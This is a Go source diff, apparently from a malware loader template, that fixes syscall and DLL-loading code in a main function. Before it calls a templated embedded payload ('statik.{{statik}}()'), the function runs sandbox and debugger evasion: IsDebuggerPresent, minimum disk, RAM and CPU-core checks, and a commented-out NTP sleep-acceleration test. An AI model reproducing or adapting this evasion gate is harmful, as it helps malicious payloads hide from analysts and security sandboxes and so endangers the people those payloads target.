@@ -1,9 +1,9 @@
 package main
 
 import (
+	"runtime"
 	"syscall"
 	"unsafe"
-	"runtime"
 
 	statik "./statik"
 	"./fs"
@@ -23,16 +23,15 @@ func main() {
 		ullAvailExtendedVirtual uint64
 	}
 
-	var kernel32, _ = syscall.LoadLibrary("kernel32.dll")
+	var kernel32 = syscall.NewLazyDLL("kernel32.dll")
 	var globalMemoryStatusEx = kernel32.NewProc("GlobalMemoryStatusEx")
 	var getDiskFreeSpaceEx = kernel32.NewProc("GetDiskFreeSpaceExW")
-	var IsDebuggerPresent, _ = syscall.GetProcAddress(kernel32, "IsDebuggerPresent")
+	var IsDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")
 
 	// Check debugger
-	var nargs uintptr = 0
-	debuggerPresent, _, _ := syscall.Syscall(uintptr(IsDebuggerPresent), nargs, 0, 0, 0)
+	debuggerPresent, _, _ := IsDebuggerPresent.Call(uintptr(0))
 	if debuggerPresent != 0 {
-		return false
+		return
 	}
 
 	// Check freee disks space (50G min)
@@ -47,7 +46,7 @@ func main() {
 		uintptr(unsafe.Pointer(&lpTotalNumberOfFreeBytes)))
 	diskSizeGB := float32(lpTotalNumberOfBytes) / 1073741824
 	if diskSizeGB < float32(50.0) {
-		return false
+		return
 	}
 
 	// Check memory
@@ -55,12 +54,12 @@ func main() {
 	memInfo.dwLength = uint32(unsafe.Sizeof(memInfo))
 	globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memInfo)))
 	if memInfo.ullTotalPhys/1073741824 < 1 {
-		return false
+		return
 	}
 
 	// Check CPU cores
 	if runtime.NumCPU() <= 2 {
-		return false
+		return
 	}
 
 	// Detect sleep acceleration with NTP
@@ -82,7 +81,7 @@ func main() {
 	// binary.Read(sock2, binary.BigEndian, ntp_transmit)
 	// tac := time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((ntp_transmit.ReceiveTime >> 32)*1000000000)))
 	// if tac.Sub(tick).Seconds() < float64(sleepSeconds) {
-	// 	return false
+	// 	return
 	// }
 
 	statik.{{statik}}()
